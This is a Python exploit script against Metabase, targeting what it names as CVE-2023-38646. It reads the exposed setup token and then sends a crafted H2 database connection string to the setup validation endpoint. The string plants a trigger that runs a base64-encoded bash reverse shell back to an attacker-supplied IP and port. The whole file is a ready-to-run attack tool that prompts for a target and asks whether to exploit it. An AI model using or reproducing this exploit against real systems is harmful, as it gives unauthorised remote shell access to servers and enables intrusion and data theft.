import requests
requests.packages.urllib3.disable_warnings()
from urllib.parse import urlencode
import json
import base64

token_path = "/api/session/properties"
exploit_path = "/api/setup/validate"
proto = ["http", "https"]

token= ""
isVuln = 0

proxy = {
	'http' : 'http://127.0.0.1:8080',
	'https' : 'http://127.0.0.1:8080'
}


#-------------------------------------------------------------------------------------------------------------------------------------------------------
#Purpose of this function is to get rid of any equal "=" chars that may occur when b64 encoding. 
#Getting rid of equal chars is simple. Find the first available space, and insert more space chars until no padding is needed.
#
#Returns: Function returns a base64 encoded payload containing user attacking machine Ip and listening port. Encoded payload does not contain equal chars
#-------------------------------------------------------------------------------------------------------------------------------------------------------

def add_padding(attck_ip, attck_port):
	#This function is basically meant to pad reverse shell code so that base64 encoding does not contain any equal signs
	payload = "bash -i >&/dev/tcp/" + attck_ip + "/" + str(attck_port) + " 0>&1"
	payload_bytes = payload.encode("ascii")
	
	while( "=" in ((base64.b64encode(payload_bytes).decode("ascii")))):
		payload = payload[:4] + " " + payload[4:]
		payload_bytes = payload.encode("ascii")

	
	return(base64.b64encode(payload_bytes).decode("ascii"))

#-------------------------------------------------------------------------------------------------------------------------------------------------------
#purpose: Receives payload and inserts it into a malicious request. This stage is reached only if metabase application is vulnerable to attack
# Return: Nothing. 
#-------------------------------------------------------------------------------------------------------------------------------------------------------

def exploit_vuln(hostname):
	global token
	
	attck_ip = input("What is the IP Address of the attack machine?: ")
	attck_port = input("What port is the attack machine listening on? ")
	
	payload = add_padding(attck_ip, attck_port)
	
	headers = {'Content-Type': 'application/json'}
	data = {
		"token" : token,
		"details" : {
			"is_on_demand" : False,
			"is_full_sync" : False,
			"is_sample" : False,
			"cache_ttl" : None,
			"refingerprint" : False,
			"auto_run_queries" : True,
			"schedules" : {},
			"details" : {
				"db" : f"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{payload}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x",
				"advanced-options" : False,
				"ssl" : True
			},
		"name" : "an-sec-research-team",
		"engine" : "h2"
		}
	}
	
	

	for items in proto:
		try:
			url = items + "://" + hostname + exploit_path
			print(f"[DEBUG] Sending request to {url}")
			response = requests.post(url, headers=headers, json=data, verify=False)
			#If you want to use proxy, comment out top and use bottom
			# response = requests.post(url, headers=headers, json=data, verify=False, proxies=proxy)
			
			print(f"\n\n[DEBUG] Response received: {response.text}")
		
			if response.status_code == 200:
				print("[DEBUG] POST to successful.\n")
			else:
				print("[DEBUG] POST to failed with status code: {response.status_code}\n")

		except requests.exceptions.RequestException as e:
			print(f"[DEBUG] Exception occurred: {e}")
			print(f"[DEBUG] Failed to connect to {url}\n")
	


#Checkign to see if metabase application is vulnerable to CVE-2023â€“38646
#If application is vulnerable, some global variables are set and used in other places of code
def check_vuln(hostname):
	global token, isVuln
	print("Checking if Metabase web app is vulnerable")	
	for items in proto:
		try:
			url = items + "://" + hostname + token_path
			print("Targeting URL: " + url + "\n\n")
			
			#If you want to specify proxy, comment out one and uncomment the other
			req = requests.get(url, verify=False)
			#req = requests.get(url, verify=False, proxies=proxy)
			
			if(req.status_code != 200):
				continue
			
			data = req.json()
			specific_data = data.get("setup-token")
			
			if specific_data is not None:
				#print(specific_data)
				token = specific_data
				isVuln = isVuln + 1	
			
			if(req.status_code == 200):
				break
			
			
		except requests.exceptions.HTTPError as errh:
			print("HTTP Error")
			print("errh.args[0]")

	

if __name__ == "__main__":
	choice = input("Please enter target ip address/DNS name:   ")
	check_vuln(choice)
	
	if(isVuln):
		print("Application is Vulnerable")
		print("Token Found: " + token)
		print("\n\n---------------------------------------\n\n")
		decision = input("Would you like to exploit the vulnerability: [y/n] ")
		if(decision == "y"):
			exploit_vuln(choice)

	else:
		print("\nTarget shows no sign of vulnerability\n")
		
	
